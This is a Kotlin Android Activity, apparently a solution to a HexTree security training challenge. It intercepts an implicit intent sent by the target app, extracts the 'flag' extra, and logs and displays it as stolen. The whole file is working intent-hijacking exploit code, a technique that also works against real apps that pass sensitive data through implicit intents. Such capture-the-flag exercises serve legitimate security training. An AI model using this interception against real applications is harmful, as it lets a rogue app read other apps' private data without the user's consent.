package com.example.hextreesolver

import android.app.Activity
import android.os.Bundle
import android.util.Log
import android.widget.Toast

class HextreeFlag10Interceptor : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Grab the incoming implicit intent sent by the HexTree app
        val incomingIntent = intent
        if (incomingIntent != null && incomingIntent.hasExtra("flag")) {
            val stolenFlag = incomingIntent.getStringExtra("flag")

            // Log it cleanly
            Log.d("STOLEN_FLAG_10", "Successfully hijacked Flag 10: $stolenFlag")

            // Display confirmation on emulator overlay screen
            Toast.makeText(this, "Flag 10 Stolen! See Logcat.", Toast.LENGTH_LONG).show()
        } else {
            Toast.makeText(this, "Intercepted, but no flag found.", Toast.LENGTH_SHORT).show()
        }

        // Terminate cleanly so your user doesn't get stuck on a blank activity layout
        finish()
    }
}
